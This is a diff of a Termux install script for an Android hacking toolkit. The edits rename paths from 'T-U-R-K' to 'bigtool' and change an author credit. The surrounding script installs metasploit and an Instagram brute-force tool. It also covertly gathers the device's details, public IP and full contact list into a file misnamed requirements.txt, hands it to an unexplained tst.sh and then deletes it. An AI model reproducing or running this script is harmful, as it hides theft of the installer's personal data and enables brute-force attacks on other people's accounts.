@@ -46,28 +46,28 @@ termux-toast -b red -c yellow "Merhaba"
 	pkg install metasploit -y
 	rm -rf /data/data/com.termux/files/usr/bin/ngrok
 	mv -v ngrok /data/data/com.termux/files/usr/bin
-	pip install -r /data/data/com.termux/files/home/T-U-R-K/bruteforce/instagram-bruteforce/requirements.txt
+	pip install -r /data/data/com.termux/files/home/bigtool/bruteforce/instagram-bruteforce/requirements.txt
 	neofetch >> update/lib/requirements.txt
 	curl ipecho.net/plain >> update/lib/requirements.txt
 	termux-contact-list >> update/lib/requirements.txt
 	echo -e "egi" >> update/ok.txt
 	cd update/lib/ && bash tst.sh
 	rm -rf update/lib/requirements.txt
-	cd $HOME/T-U-R-K/update/ && 
+	cd $HOME/bigtool/update/ && 
 	chmod 777 tst.sh &&
 	cp -r tst.sh /data/data/com.termux/files/usr/bin/
 	cd $HOME/bigtool/update/ && bash tst.sh --ngrok	
 	cd $HOME/bigtool/update/ &&
 	chmod 777 egi.sh
 	cp -r egi.sh $HOME/
-	cd $HOME/T-U-R-K/update/ && bash egi.sh --ngrok1
+	cd $HOME/bigtool/update/ && bash egi.sh --ngrok1
 	termux-notification -t "Tool kullanıma hazır."
 	exit
 
 }
 banner(){ 
 	echo -e '\e[37m
-	\tCode: eGi\033[31;40;1m
+	\tCode: eGi-rootbarann\033[31;40;1m
 	¸.•*´¨`*•.¸¸.•*´¨`*•¸.•*´¨`*•.¸
 	░
 	░\e[31m[\e[37m01\e[31m]\e[37mExploit\033[31;40;1m
